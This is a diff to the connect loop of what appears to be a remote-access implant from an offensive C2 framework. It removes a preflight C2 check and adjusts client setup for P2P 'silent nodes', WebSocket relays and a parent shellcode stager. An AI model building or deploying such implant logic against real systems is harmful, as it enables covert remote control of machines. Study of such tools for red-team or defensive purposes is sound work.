@@ -221,21 +221,10 @@ func agent_main() {
 
 	isCheckedIn := false
 connect:
-	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	// Preflight Check
-	// Preflight Check — skipped for Silent Nodes (no direct C2 path).
-	isSilentNode := common.RuntimeConfig.IsP2PEnabled && !common.RuntimeConfig.IsDirectC2Enabled
-	if !isSilentNode {
-		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
-			logging.Infof("Preflight check failed, signaling parent and sleeping")
-			conditionalC2FailNotify()
-			goto connect
-		}
-	}
-
-	// Build C2 HTTP client. Silent Nodes already created theirs above with relay dialer.
+	// Build C2 HTTP client. Silent Nodes (P2P-only) use their relay dialer instead.
 	// Rendezvous relay endpoints (ws://wss://) don't use an HTTP client at all —
 	// the worker_ws channel dials its own WebSocket; nil client is expected there.
+	isSilentNode := common.RuntimeConfig.IsP2PEnabled && !common.RuntimeConfig.IsDirectC2Enabled
 	isRelayEndpoint := strings.HasPrefix(def.CCAddress, "ws://") || strings.HasPrefix(def.CCAddress, "wss://")
 	if !isSilentNode && !isRelayEndpoint {
 		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
@@ -311,7 +300,7 @@ connect:
 	}
 	logging.Infof("Message tunnel closed, backing off before reconnect")
 	// Signal parent (shellcode stager) to suspend us immediately
-	// This prevents attempting reconnection that gets interrupted mid-preflight
+	// This prevents attempting reconnection that gets interrupted mid-checkin
 	conditionalC2FailNotify()
 	// When resumed, reconnect with fresh state
 	isCheckedIn = false // reset check-in status so we do a fresh check-in
